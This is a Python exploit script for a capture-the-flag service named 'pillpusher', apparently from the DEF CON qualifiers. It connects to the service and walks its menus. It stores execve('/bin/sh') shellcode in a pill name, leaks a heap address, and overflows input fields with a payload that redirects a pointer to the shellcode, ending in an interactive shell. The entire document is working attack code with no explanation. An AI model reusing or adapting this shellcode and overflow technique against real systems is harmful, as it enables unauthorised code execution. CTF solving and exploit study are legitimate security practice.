from ch1mac import *

s = SockCon("10.211.55.4",31337,100)
#s = SockCon("pillpusher_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me",43868,100)

pill_name = "A"*0xFC+"\n"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

RD(s,"-> ")
s.send("2\n")
RD(s,"-> ")
s.send("1\n") #add pill

RD(s,"Pill Name: ")
s.send(shellcode.ljust(0x100,"A")+"\n")
RD(s,"Dosage: ")
s.send("0\n")
RD(s,"Schedule: ")
s.send("0\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")

RD(s,"-> ")
s.send("3\n")
print RD(s,shellcode.ljust(0x100,"A"))
tmp = RD(s,"\n")[:-1]
hexdump(tmp)
tmp = tmp.ljust(8,"\x00")
heap = up64(tmp)
log.info(hex(heap))
log.info(hex(heap+0x48))

RD(s,"-> ")
s.send("1\n")
RD(s,"Pill Name: ")
s.send(pill_name)
RD(s,"Dosage: ")
s.send("0\n")
RD(s,"Schedule: ")
s.send("0\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")

payload = "A"*12
payload += p64(0x0202020202020202)
payload += p64(heap+0x48)+"\n"

RD(s,"-> ")
s.send("1\n")
RD(s,"Pill Name: ")
s.send(payload)
RD(s,"Dosage: ")
s.send("0\n")
RD(s,"Schedule: ")
s.send("0\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")
RD(s,": ")
s.send("Cat\n\n")

RD(s,"-> ")
s.send("6\n")
RD(s,"-> ")
s.send("3\n") 
RD(s,"-> ")
s.send("1\n")#add pharm

RD(s,": ")
s.send("Cat\n")
RD(s,": ")
s.send("1\n")

RD(s,"-> ")
s.send("5\n")
RD(s,"-> ")
s.send("4\n")
RD(s,"-> ")
s.send("1\n") #add pat

RD(s,": ")
s.send("Cat\n")
RD(s,": ")
s.send("y\n")
RD(s,": ")
s.send("Cat\n\n")

RD(s,"-> ")
s.send("5\n")
RD(s,"-> ")
s.send("1\n")
RD(s,"-> ")
s.send("1\n")

RD(s,"? ")
s.send("Cat\n")
RD(s,": ")
s.send(pill_name+payload+"\n")
RD(s,": ")
s.send("Cat\n\n")

RD(s,"-> ")
s.send("5\n")
RD(s,"-> ")
s.send("5\n")
RD(s,"-> ")
s.send("1\n")

RD(s,": ")
s.send("Cat\n")
RD(s,"-> ")
s.send("2\n")
RD(s,": ")
s.send("1\n")
RD(s,"-> ")
s.send("3\n")
RD(s,": ")
s.send("Cat\n")

RD(s,"-> ")
s.send("4\n")
RD(s,": ")
s.send("-1\n")
RD(s,": ")
s.send(pill_name)
RD(s,": ")
s.send(pill_name)
RD(s,": ")
s.send(payload)
RD(s,": ")
s.send("\n")

GiveMeShell(s)
